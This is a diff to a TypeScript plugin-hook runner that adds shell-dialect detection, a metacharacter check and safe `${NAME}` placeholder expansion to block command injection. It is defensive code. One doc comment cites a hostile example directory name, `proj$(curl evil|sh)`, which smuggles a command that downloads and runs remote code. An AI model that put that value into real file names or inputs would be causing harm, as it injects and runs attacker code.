@@ -1,6 +1,6 @@
 import { spawnSync } from 'node:child_process';
 import { existsSync } from 'node:fs';
-import { win32 } from 'node:path';
+import { basename, win32 } from 'node:path';
 
 import type { PluginHookCommandHandler, PluginHookSourceFormat } from './contracts.js';
 
@@ -125,4 +125,51 @@ function findExecutable(
     .split(/\r?\n/u)
     .map((line) => line.trim())
     .find(Boolean);
+}
+
+/** What parses a hook command: nothing (argv), a POSIX shell, PowerShell or cmd.exe. */
+export type HookShellDialect = 'none' | 'posix' | 'powershell' | 'cmd';
+
+export function hookShellDialect(invocation: HookCommandInvocation): HookShellDialect {
+  if (invocation.shell) return process.platform === 'win32' ? 'cmd' : 'posix';
+  const executable = basename(invocation.command.replace(/\\/gu, '/')).toLowerCase();
+  if (/^(?:pwsh|powershell)(?:\.exe)?$/u.test(executable)) return 'powershell';
+  if (/^(?:sh|bash)(?:\.exe)?$/u.test(executable) && invocation.args[0] === '-c') return 'posix';
+  return 'none';
+}
+
+/**
+ * Values that cannot change how a command is parsed wherever they are written (unquoted, in double
+ * quotes, after `cd`): no quoting, expansion, redirection, separator or glob character. Backslash is
+ * ordinary in a Windows path and an escape everywhere else.
+ */
+function isInertShellText(value: string, platform: NodeJS.Platform): boolean {
+  const forbidden = platform === 'win32' ? /[`$"'^&|<>(){}[\]*?~!#%;\r\n\0]/u : /[`$"'\\&|<>(){}[\]*?~!#%;\r\n\0]/u;
+  return !forbidden.test(value);
+}
+
+/**
+ * Fill `${NAME}` placeholders of a hook command from its environment.
+ *
+ * Into an argv (`none`) the value is data and is written as is. Into text that a shell parses it
+ * must stay data too: a workspace directory named `proj$(curl evil|sh)` may not become code. A value
+ * that is inert in any position is written in place (so `"${CLAUDE_PLUGIN_ROOT}/x"` and
+ * `'${...}'` keep working); any other value is left to the shell, which expands the variable it
+ * was exported as without parsing the result: `${NAME}` for POSIX shells, `${env:NAME}` for
+ * PowerShell. cmd.exe cannot expand a variable without parsing the value, so such a value is refused.
+ */
+export function expandHookPlaceholders(
+  value: string,
+  env: NodeJS.ProcessEnv,
+  dialect: HookShellDialect,
+  platform: NodeJS.Platform = process.platform,
+): string {
+  return value.replace(/\$\{([A-Z][A-Z0-9_]*)\}/gu, (placeholder, name: string) => {
+    const replacement = env[name];
+    if (replacement === undefined) return placeholder;
+    if (dialect === 'none' || isInertShellText(replacement, platform)) return replacement;
+    if (dialect === 'posix') return placeholder;
+    if (dialect === 'powershell') return `\${env:${name}}`;
+    throw new Error(`The value of ${name} cannot be used in a cmd.exe hook command safely`);
+  });
 }
